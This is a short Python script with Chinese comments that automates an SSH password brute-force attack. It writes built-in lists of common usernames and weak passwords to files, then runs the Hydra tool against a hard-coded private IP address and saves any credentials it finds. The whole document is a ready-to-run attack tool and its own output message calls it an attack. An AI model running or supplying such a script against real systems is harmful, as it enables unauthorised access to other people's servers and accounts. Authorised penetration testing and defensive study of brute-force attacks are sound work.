#!/usr/bin/env python3

import subprocess
import os

# 配置参数
target_ip = "192.168.135.231"  # 目标主机 IP
username_list = "usernames.txt"  # 用户名列表路径
password_list = "passwords.txt"  # 密码列表路径
output_file = "hydra_ssh_results.txt"  # 输出结果文件

# 常见用户名列表
common_usernames = [
    "admin", "root", "user", "test", "guest", "info", "administrator",
    "mysql", "apache", "ftp", "ubuntu", "pi", "oracle", "postgres","li"
]

# 常见密码列表
common_passwords = [
    "123456", "password", "123456789", "12345678", "12345", "1234567",
    "admin", "123123", "qwerty", "abc123", "111111", "password1",
    "1234", "iloveyou", "123", "000000", "123321", "654321", "666666",
    "7777777", "888888", "987654321", "password123", "1q2w3e4r", "zxcvbnm"
]

# 生成用户名列表文件
with open(username_list, "w") as f:
    for username in common_usernames:
        f.write(f"{username}\n")

# 生成密码列表文件
with open(password_list, "w") as f:
    for password in common_passwords:
        f.write(f"{password}\n")

# 确保输出文件不存在
if os.path.exists(output_file):
    os.remove(output_file)

# 构建 Hydra 命令
hydra_cmd = [
    "hydra",
    "-L", username_list,
    "-P", password_list,
    "-o", output_file,
    "-t", "4",  # 并发线程数
    f"ssh://{target_ip}"
]

# 执行 Hydra 命令
try:
    subprocess.run(hydra_cmd, check=True)
    print(f"Hydra 攻击完成，结果已保存至 {output_file}")
except subprocess.CalledProcessError as e:
    print(f"Hydra 执行失败：{e}")

